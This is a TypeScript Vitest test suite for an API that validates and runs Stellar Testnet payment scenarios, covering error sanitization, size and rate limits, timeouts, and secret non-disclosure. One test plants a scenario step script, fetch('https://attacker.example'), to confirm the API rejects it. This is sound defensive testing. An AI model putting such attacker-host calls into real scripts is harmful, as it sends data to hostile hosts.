import { afterEach, describe, expect, it, vi } from "vitest";
import { buildApp } from "../src/app.js";
import type { AppInstance } from "../src/app.js";
import type { LedgerExecution, LedgerGateway, Scenario } from "../src/domain.js";
import type { AppConfig } from "../src/config.js";
import { SafeRunError } from "../src/errors.js";
import { DatabaseUnavailableError } from "../src/database.js";
import { completeScenario } from "./fixtures.js";

const config: AppConfig = {
  host: "127.0.0.1",
  port: 3001,
  logLevel: "silent",
  horizonUrl: "https://horizon-testnet.stellar.org",
  friendbotUrl: "https://friendbot.stellar.org",
  runTimeoutMs: 5_000,
  stepTimeoutMs: 1_000,
  maxConcurrentRuns: 2,
  maxStoredRuns: 100,
  runRetentionMs: 60_000,
  rateLimitMax: 100,
  runRateLimitMax: 50,
  rateLimitWindowMs: 60_000,
  bodyLimitBytes: 16_384,
  persistenceMode: "disabled",
  runPersistenceEnabled: false,
  databasePoolMax: 5,
  databaseConnectionTimeoutMs: 5_000,
  databaseQueryTimeoutMs: 5_000,
  databaseIdleTimeoutMs: 10_000,
};

const ledger: LedgerGateway = {
  execute: vi.fn(async (_scenario: Scenario): Promise<LedgerExecution> => ({
    steps: [{ id: "send-xlm", type: "payment", status: "passed", message: "Confirmed." }],
    assertions: [{ type: "balanceEquals", status: "passed", expected: "5", actual: "5", message: "Balance matched." }],
  })),
};

const apps: AppInstance[] = [];

function createApp(options: { config?: AppConfig; ledger?: LedgerGateway } = {}) {
  const app = buildApp({ config: options.config ?? config, ledger: options.ledger ?? ledger });
  apps.push(app);
  return app;
}

afterEach(async () => {
  await Promise.all(apps.splice(0).map((app) => app.close()));
  vi.clearAllMocks();
});

describe("Esure API", () => {
  it("reports Testnet health", async () => {
    const response = await createApp().inject({ method: "GET", url: "/health" });
    expect(response.statusCode).toBe(200);
    expect(response.json()).toEqual({ status: "ok", network: "testnet" });
  });

  it("reports explicitly disabled persistence readiness on the unchanged P1 path", async () => {
    const response = await createApp().inject({ method: "GET", url: "/ready" });
    expect(response.statusCode).toBe(200);
    expect(response.json()).toEqual({ status: "ready", network: "testnet", database: "disabled" });
  });

  it("fails closed for version history when published persistence is disabled", async () => {
    const response = await createApp().inject({ method: "GET", url: "/api/v1/scenarios/xlm-payment/versions" });
    expect(response.statusCode).toBe(503);
    expect(response.json().error.code).toBe("PERSISTENCE_REQUIRED");
  });

  it("lists the bundled scenarios", async () => {
    const response = await createApp().inject({ method: "GET", url: "/api/v1/scenarios" });
    expect(response.statusCode).toBe(200);
    expect(response.json().items.length).toBeGreaterThanOrEqual(10);
    expect(response.json().items[0].contentHash).toMatch(/^sha256:[a-f0-9]{64}$/);
  });

  it("publishes an OpenAPI 3.1 document containing declarative endpoints", async () => {
    const response = await createApp().inject({ method: "GET", url: "/openapi.json" });
    expect(response.statusCode).toBe(200);
    expect(response.json()).toMatchObject({ openapi: "3.1.0" });
    expect(response.json().paths).toHaveProperty("/api/v1/runs/definitions");
    expect(response.json().paths).toHaveProperty("/api/v1/scenarios/{scenarioId}/versions");
    expect(response.json().paths).toHaveProperty("/api/v1/scenarios/{scenarioId}/versions/{version}/export");
    expect(response.json().components.schemas).toHaveProperty("ScenarioV1");
  });

  it.each(["POST", "PUT", "PATCH", "DELETE"] as const)("does not expose public scenario mutation via %s", async (method) => {
    const response = await createApp().inject({ method, url: "/api/v1/scenarios/xlm-payment/versions", payload: { name: "attacker change" } });
    expect(response.statusCode).toBe(404);
  });

  it("validates and starts an inline JSON scenario with version and content hash", async () => {
    const app = createApp();
    const definition = completeScenario();
    const validated = await app.inject({ method: "POST", url: "/api/v1/scenarios/validate", payload: definition });
    expect(validated.statusCode).toBe(200);
    expect(validated.json()).toMatchObject({ valid: true, scenarioId: definition.id, schemaVersion: 1 });
    expect(validated.json().contentHash).toMatch(/^sha256:[a-f0-9]{64}$/);

    const started = await app.inject({ method: "POST", url: "/api/v1/runs/definitions", payload: definition });
    expect(started.statusCode).toBe(202);
    expect(started.json()).toMatchObject({ scenarioId: definition.id, scenarioVersion: 1, scenarioSchemaVersion: 1 });
    expect(started.json().scenarioContentHash).toBe(validated.json().contentHash);
  });

  it("validates and starts a raw YAML scenario", async () => {
    const yaml = `schemaVersion: 1\nid: api-yaml\nversion: 1\nname: API YAML\ndescription: Submitted as YAML.\nnetwork: testnet\naccounts:\n  - { id: sender, generate: true, fund: true }\n  - { id: recipient, generate: true, fund: true }\nassets:\n  - { id: xlm, type: native }\nsteps:\n  - { id: pay, type: payment, from: sender, to: recipient, asset: xlm, amount: \"1\" }\nassertions:\n  - { type: stepSucceeded, step: pay }\n`;
    const app = createApp();
    expect((await app.inject({ method: "POST", url: "/api/v1/scenarios/validate", headers: { "content-type": "application/yaml" }, payload: yaml })).statusCode).toBe(200);
    expect((await app.inject({ method: "POST", url: "/api/v1/runs/definitions", headers: { "content-type": "application/yaml" }, payload: yaml })).statusCode).toBe(202);
  });

  it.each([
    ["truncated JSON", "/api/v1/scenarios/validate", '{"private-marker":', "INVALID_SCENARIO", "Scenario definition is invalid.", "definition is not valid JSON"],
    ["invalid JSON", "/api/v1/scenarios/validate", "{private-marker}", "INVALID_SCENARIO", "Scenario definition is invalid.", "definition is not valid JSON"],
    ["truncated JSON", "/api/v1/runs/definitions", '{"private-marker":', "INVALID_SCENARIO", "Scenario definition is invalid.", "definition is not valid JSON"],
    ["invalid JSON", "/api/v1/runs/definitions", "{private-marker}", "INVALID_SCENARIO", "Scenario definition is invalid.", "definition is not valid JSON"],
    ["truncated JSON", "/api/v1/runs", '{"private-marker":', "INVALID_REQUEST", "The request body is invalid.", "request body is not valid JSON"],
    ["invalid JSON", "/api/v1/runs", "{private-marker}", "INVALID_REQUEST", "The request body is invalid.", "request body is not valid JSON"],
  ])("rejects %s on %s without exposing parser internals", async (_label, url, payload, code, message, detail) => {
    const response = await createApp().inject({
      method: "POST",
      url,
      headers: { "content-type": "application/json" },
      payload,
    });
    expect(response.statusCode).toBe(400);
    expect(response.json().error).toMatchObject({
      code,
      message,
      details: [detail],
    });
    expect(response.body).not.toContain("private-marker");
    expect(response.body).not.toContain("SyntaxError");
    expect(response.body).not.toContain("FST_ERR_CTP_INVALID_JSON_BODY");
    expect(response.body).not.toContain("Body is not valid JSON");
  });

  it.each([
    "/api/v1/scenarios/validate",
    "/api/v1/runs/definitions",
  ])("rejects malformed YAML on %s as a sanitized scenario parser error", async (url) => {
    const response = await createApp().inject({
      method: "POST",
      url,
      headers: { "content-type": "application/yaml" },
      payload: "accounts: [\n",
    });
    expect(response.statusCode).toBe(400);
    expect(response.json().error).toMatchObject({
      code: "INVALID_SCENARIO",
      message: "Scenario definition is invalid.",
      details: ["definition is not valid YAML"],
    });
    expect(response.body).not.toContain("YAMLParseError");
  });

  it("keeps genuine unexpected server failures on the sanitized 500 path", async () => {
    const app = createApp();
    app.get("/test-only-internal-failure", async () => { throw new Error("private implementation detail"); });
    const response = await app.inject({ method: "GET", url: "/test-only-internal-failure" });
    expect(response.statusCode).toBe(500);
    expect(response.json().error).toMatchObject({ code: "INTERNAL_ERROR", message: "The request could not be completed." });
    expect(response.body).not.toContain("private implementation detail");
  });

  it("returns a sanitized 503 for genuine database availability failures", async () => {
    const app = createApp();
    app.get("/test-only-database-failure", async () => { throw new DatabaseUnavailableError(); });
    const response = await app.inject({ method: "GET", url: "/test-only-database-failure" });
    expect(response.statusCode).toBe(503);
    expect(response.json().error).toMatchObject({ code: "DATABASE_UNAVAILABLE", message: "The persistent scenario catalogue is temporarily unavailable." });
    expect(response.body).not.toContain("ECONNREFUSED");
    expect(response.body).not.toContain("postgresql://");
  });

  it("returns bounded validation details for malicious inline scenarios", async () => {
    const definition = completeScenario() as any;
    definition.network = "mainnet";
    definition.steps[0].script = "fetch('https://attacker.example')";
    const response = await createApp().inject({ method: "POST", url: "/api/v1/runs/definitions", payload: definition });
    expect(response.statusCode).toBe(400);
    expect(response.json().error).toMatchObject({ code: "INVALID_SCENARIO", message: "Scenario definition is invalid." });
    expect(response.json().error.details.length).toBeLessThanOrEqual(50);
    expect(response.body).not.toContain("process.env");
  });

  it("returns a consistent not-found envelope", async () => {
    const response = await createApp().inject({ method: "GET", url: "/api/v1/scenarios/unknown" });
    expect(response.statusCode).toBe(404);
    expect(response.json().error.code).toBe("SCENARIO_NOT_FOUND");
  });

  it("rejects unknown request properties", async () => {
    const response = await createApp().inject({
      method: "POST",
      url: "/api/v1/runs",
      payload: { scenarioId: "xlm-payment", network: "mainnet" },
    });
    expect(response.statusCode).toBe(400);
    expect(response.json().error.code).toBe("INVALID_REQUEST");
  });

  it("rejects oversized request bodies before validation or execution", async () => {
    const response = await createApp({ config: { ...config, bodyLimitBytes: 1_024 } }).inject({
      method: "POST",
      url: "/api/v1/runs",
      headers: { "content-type": "application/json" },
      payload: JSON.stringify({ scenarioId: "xlm-payment", padding: "x".repeat(2_000) }),
    });
    expect(response.statusCode).toBe(413);
    expect(response.json().error.code).toBe("INVALID_REQUEST");
  });

  it("enforces the scenario definition limit even when the API body limit is configured higher", async () => {
    const definition = completeScenario() as ReturnType<typeof completeScenario> & { padding?: string };
    definition.padding = "x".repeat(20_000);
    const response = await createApp({ config: { ...config, bodyLimitBytes: 32_768 } }).inject({
      method: "POST", url: "/api/v1/runs/definitions", payload: definition,
    });
    expect(response.statusCode).toBe(400);
    expect(response.json().error.code).toBe("INVALID_SCENARIO");
  });

  it("starts and completes a run without exposing secrets", async () => {
    const app = createApp();
    const started = await app.inject({
      method: "POST",
      url: "/api/v1/runs",
      payload: { scenarioId: "xlm-payment", inputs: {} },
    });
    expect(started.statusCode).toBe(202);
    const id = started.json().id as string;

    await vi.waitFor(async () => {
      const response = await app.inject({ method: "GET", url: `/api/v1/runs/${id}` });
      expect(response.json().status).toBe("passed");
      expect(response.body).not.toMatch(/S[A-Z2-7]{55}/);
    });
  });

  it("preserves completed steps when a later step fails", async () => {
    const failingLedger: LedgerGateway = {
      execute: vi.fn(async (_scenario, options) => {
        options?.onStep?.({ id: "fund-accounts", type: "fundAccounts", status: "passed", message: "Funded." });
        options?.onStep?.({
          id: "send-xlm",
          type: "payment",
          status: "failed",
          stellarTransactionCode: "tx_failed",
          stellarOperationCodes: ["op_underfunded"],
          message: "Stellar rejected the payment.",
        });
        throw new SafeRunError({
          code: "STELLAR_TRANSACTION_FAILED",
          message: "Stellar rejected the payment.",
          category: "stellar",
          retryable: false,
          failedStepId: "send-xlm",
          stellarTransactionCode: "tx_failed",
          stellarOperationCodes: ["op_underfunded"],
        });
      }),
    };
    const app = createApp({ ledger: failingLedger });
    const started = await app.inject({ method: "POST", url: "/api/v1/runs", payload: { scenarioId: "xlm-payment" } });
    const id = started.json().id as string;

    await vi.waitFor(async () => {
      const report = (await app.inject({ method: "GET", url: `/api/v1/runs/${id}` })).json();
      expect(report.status).toBe("failed");
      expect(report.steps).toHaveLength(2);
      expect(report.summary).toMatchObject({ stepsPassed: 1, stepsFailed: 1 });
      expect(report.error).toMatchObject({
        code: "STELLAR_TRANSACTION_FAILED",
        failedStepId: "send-xlm",
        stellarOperationCodes: ["op_underfunded"],
      });
    });
  });

  it("enforces the overall run timeout with a sanitized structured error", async () => {
    const stalledLedger: LedgerGateway = { execute: vi.fn(() => new Promise<LedgerExecution>(() => undefined)) };
    const app = createApp({ config: { ...config, runTimeoutMs: 25 }, ledger: stalledLedger });
    const started = await app.inject({ method: "POST", url: "/api/v1/runs", payload: { scenarioId: "xlm-payment" } });
    const id = started.json().id as string;

    await vi.waitFor(async () => {
      const report = (await app.inject({ method: "GET", url: `/api/v1/runs/${id}` })).json();
      expect(report.status).toBe("failed");
      expect(report.error).toMatchObject({ code: "RUN_TIMEOUT", category: "timeout", retryable: true });
    }, { timeout: 1_000 });
  });

  it("rejects run creation when the concurrency limit is reached", async () => {
    let release!: (value: LedgerExecution) => void;
    const blockedLedger: LedgerGateway = {
      execute: vi.fn(() => new Promise<LedgerExecution>((resolve) => { release = resolve; })),
    };
    const app = createApp({ config: { ...config, maxConcurrentRuns: 1 }, ledger: blockedLedger });
    const first = await app.inject({ method: "POST", url: "/api/v1/runs", payload: { scenarioId: "xlm-payment" } });
    expect(first.statusCode).toBe(202);
    await vi.waitFor(() => expect(blockedLedger.execute).toHaveBeenCalled());
    const second = await app.inject({ method: "POST", url: "/api/v1/runs", payload: { scenarioId: "xlm-payment" } });
    expect(second.statusCode).toBe(503);
    expect(second.json().error.code).toBe("RUNNER_AT_CAPACITY");
    release({ steps: [], assertions: [] });
  });

  it("applies a stricter per-client rate limit to run creation", async () => {
    const app = createApp({ config: { ...config, runRateLimitMax: 1 } });
    expect((await app.inject({ method: "POST", url: "/api/v1/runs", payload: { scenarioId: "xlm-payment" } })).statusCode).toBe(202);
    const limited = await app.inject({ method: "POST", url: "/api/v1/runs", payload: { scenarioId: "xlm-payment" } });
    expect(limited.statusCode).toBe(429);
    expect(limited.json().error.code).toBe("RATE_LIMITED");
  });
});
